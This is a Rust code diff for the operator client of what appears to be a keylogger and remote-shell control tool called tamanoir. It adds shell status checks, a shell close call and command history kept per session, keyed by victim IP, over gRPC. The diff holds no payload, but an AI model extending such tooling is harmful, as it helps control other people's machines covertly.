@@ -1,5 +1,5 @@
 use std::{
-    collections::HashMap,
+    collections::{hash_map::Entry, HashMap},
     net::Ipv4Addr,
     sync::{Arc, RwLock},
 };
@@ -12,12 +12,13 @@ use crate::{
     app::{AppResult, SessionsMap},
     section::{
         keylogger::init_keymaps,
-        shell::{ShellCommandEntry, ShellCommandHistory, ShellHistoryEntryType},
+        shell::{ShellCommandEntry, ShellCommandHistoryMap, ShellHistoryEntryType},
     },
     tamanoir_grpc::{
         rce_client::RceClient, remote_shell_client::RemoteShellClient,
         session_client::SessionClient, Empty, SessionRcePayload, SessionRequest, SessionResponse,
-        SetSessionLayoutRequest, SetSessionRceRequest, ShellStd,
+        SetSessionLayoutRequest, SetSessionRceRequest, ShellStatusEnum, ShellStatusResponse,
+        ShellStd,
     },
 };
 
@@ -73,16 +74,38 @@ impl RemoteShellServiceClient {
     }
     pub async fn send_cmd(&mut self, ip: String, cmd: String) -> AppResult<()> {
         let shell_msg = ShellStd {
-            ip,
+            ip: ip.clone(),
             message: cmd.clone(),
         };
         let msg = Request::new(shell_msg);
-        match self.client.send_shell_std_in(msg).await {
-            Err(status) => {
-                dbg!("{}", status.code());
+        match self
+            .client
+            .shell_status(Request::new(SessionRequest { ip: ip.to_string() }))
+            .await?
+            .into_inner()
+        {
+            ShellStatusResponse { status: 1 } => {
+                let _ = self.client.send_shell_std_in(msg).await?;
+                Ok(())
             }
-            _ => {}
-        };
+            _ => Err("Shell Unavailable".into()),
+        }
+    }
+
+    pub async fn shell_status(&mut self, session_id: String) -> anyhow::Result<ShellStatusEnum> {
+        Ok(self
+            .client
+            .shell_status(Request::new(SessionRequest { ip: session_id }))
+            .await?
+            .into_inner()
+            .status())
+    }
+    pub async fn shell_close(&mut self, session_id: String) -> AppResult<()> {
+        let _ = self
+            .client
+            .shell_close(Request::new(SessionRequest { ip: session_id }))
+            .await?
+            .into_inner();
         Ok(())
     }
 }
@@ -129,8 +152,8 @@ pub trait StreamReceiver<T> {
     ) -> impl std::future::Future<Output = anyhow::Result<()>> + Send;
 }
 
-impl StreamReceiver<Vec<ShellCommandEntry>> for RemoteShellServiceClient {
-    async fn listen(&mut self, update_object: ShellCommandHistory) -> anyhow::Result<()> {
+impl StreamReceiver<HashMap<String, Vec<ShellCommandEntry>>> for RemoteShellServiceClient {
+    async fn listen(&mut self, update_object: ShellCommandHistoryMap) -> anyhow::Result<()> {
         let mut stream = self
             .client
             .watch_shell_std_out(Request::new(Empty {}))
@@ -138,10 +161,21 @@ impl StreamReceiver<Vec<ShellCommandEntry>> for RemoteShellServiceClient {
             .into_inner();
 
         while let Some(Ok(msg)) = stream.next().await {
-            update_object.write().unwrap().push(ShellCommandEntry {
+            let session_id = msg.ip;
+            let entry = ShellCommandEntry {
                 entry_type: ShellHistoryEntryType::Response,
                 text: msg.message,
-            });
+                session_id: session_id.clone(),
+            };
+            let mut update_obj_inner = update_object.write().unwrap();
+            match update_obj_inner.entry(session_id) {
+                Entry::Vacant(e) => {
+                    e.insert(vec![entry]);
+                }
+                Entry::Occupied(mut e) => {
+                    e.get_mut().push(entry);
+                }
+            }
         }
         Ok(())
     }
